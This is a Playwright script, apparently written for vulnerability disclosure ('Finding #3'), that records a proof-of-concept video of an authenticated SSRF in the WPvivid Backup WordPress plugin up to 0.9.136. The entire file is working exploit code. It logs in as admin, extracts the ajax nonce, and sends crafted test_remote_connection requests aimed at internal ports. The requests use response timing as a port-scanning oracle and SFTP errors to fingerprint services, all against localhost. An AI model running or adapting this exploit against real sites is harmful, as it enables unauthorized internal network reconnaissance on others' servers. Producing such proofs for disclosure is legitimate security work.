// PoC Video — Finding #3: WPvivid <= 0.9.136 — SSRF via test_remote_connection (admin)
// Génère poc-3-wpvivid-ssrf (1920x1080, ~38s) — login admin → SSRF timing oracle (port 3306 ouvert ~10s vs port fermé ~0s) → fingerprinting SFTP
const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch({args:['--no-sandbox']});
  const context = await browser.newContext({ viewport: { width: 1920, height: 1080 }, recordVideo: { dir: './videos/', size: { width: 1920, height: 1080 } } });
  const page = await context.newPage();

  await page.setContent(`<html><body style="background:#1a1a2e;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh">
    <div style="text-align:center">
    <h1 style="color:#e94560">WPvivid Backup Plugin <= 0.9.136</h1>
    <h2>CWE-918 — SSRF via test_remote_connection (Administrator)</h2>
    <p>Internal port-scanning oracle via FTP/SFTP storage connection test</p>
    </div></body></html>`);
  await page.waitForTimeout(6000);

  // Login admin
  await page.goto('http://127.0.0.1/wp-login.php', { waitUntil: 'domcontentloaded' });
  await page.fill('#user_login', 'admin');
  await page.fill('#user_pass', 'adminPass123!');
  await page.evaluate(() => { const b = document.createElement('div'); b.style.cssText='position:fixed;top:10px;left:10px;background:#e94560;color:#fff;padding:8px 16px;z-index:9999;font-family:monospace'; b.textContent = 'Administrator session'; document.body.appendChild(b); });
  await page.waitForTimeout(2500);
  await page.click('#wp-submit');
  await page.waitForLoadState('domcontentloaded');
  await page.waitForTimeout(2500);

  // SSRF: port ouvert (3306) — attente bannière FTP ~10s
  await page.goto('http://127.0.0.1/wp-admin/', { waitUntil: 'domcontentloaded' });
  await page.evaluate(async () => {
    const pageHTML = await (await fetch('/wp-admin/admin.php?page=WPvivid', {credentials:'include'})).text();
    const m = pageHTML.match(/"ajax_nonce":"([a-f0-9]+)"/);
    const nonce = m ? m[1] : null;
    window.__nonce = nonce;
    const b = document.createElement('div'); b.style.cssText='position:fixed;top:60px;left:10px;background:#000;color:#e94560;padding:10px;z-index:9999;font-family:monospace;white-space:pre-wrap;max-width:90%';
    b.textContent = 'SSRF step 1: FTP test to 127.0.0.1:3306 (internal MariaDB — port OPEN)\nNonce: ' + nonce; document.body.appendChild(b);
    if (nonce) {
      const body = new URLSearchParams({
        action: 'wpvivid_test_remote_connection', nonce: nonce, type: 'ftp',
        remote: JSON.stringify({type:'ftp', host:'127.0.0.1', username:'x', password:'x', port:'3306', path:'/', passive:'1'}),
      });
      const r = await fetch('/wp-admin/admin-ajax.php', { method: 'POST', body, credentials: 'include' });
      const txt = await r.text();
      const el = document.createElement('div'); el.style.cssText='position:fixed;top:120px;left:10px;background:#000;color:#e94560;padding:10px;z-index:9999;font-family:monospace;white-space:pre-wrap;max-width:90%';
      el.textContent = 'Response (~10s = port OPEN, FTP banner wait): ' + txt.slice(0,150); document.body.appendChild(el);
    }
  });
  await page.waitForTimeout(12000);

  // Contrôle négatif: port fermé (59999) → réponse instantanée
  await page.evaluate(async () => {
    const nonce = window.__nonce; if (!nonce) return;
    const t0 = Date.now();
    const body = new URLSearchParams({
      action: 'wpvivid_test_remote_connection', nonce: nonce, type: 'ftp',
      remote: JSON.stringify({type:'ftp', host:'127.0.0.1', username:'x', password:'x', port:'59999', path:'/', passive:'1'}),
    });
    const r = await fetch('/wp-admin/admin-ajax.php', { method: 'POST', body, credentials: 'include' });
    await r.text();
    const ms = Date.now() - t0;
    const b = document.createElement('div'); b.style.cssText='position:fixed;bottom:60px;left:10px;background:#000;color:#e94560;padding:10px;z-index:9999;font-family:monospace;white-space:pre-wrap;max-width:90%';
    b.textContent = 'NEGATIVE CONTROL: port 59999 (CLOSED) → same error in ' + ms + 'ms\nTiming oracle: ~10s = open / ~0s = closed → internal port scanning'; document.body.appendChild(b);
  });
  await page.waitForTimeout(7000);

  // Fingerprinting SFTP
  await page.evaluate(async () => {
    const nonce = window.__nonce; if (!nonce) return;
    const body = new URLSearchParams({
      action: 'wpvivid_test_remote_connection', nonce: nonce, type: 'sftp',
      remote: JSON.stringify({type:'sftp', host:'127.0.0.1', username:'x', password:'x', port:'3306', path:'/'}),
    });
    const r = await fetch('/wp-admin/admin-ajax.php', { method: 'POST', body, credentials: 'include' });
    const txt = await r.text();
    const b = document.createElement('div'); b.style.cssText='position:fixed;top:120px;right:10px;background:#000;color:#0f0;padding:10px;z-index:9999;font-family:monospace;white-space:pre-wrap;max-width:45%';
    b.textContent = 'SFTP fingerprinting: ' + txt.slice(0,200); document.body.appendChild(b);
  });
  await page.waitForTimeout(6000);

  await context.close();
  await browser.close();
})();
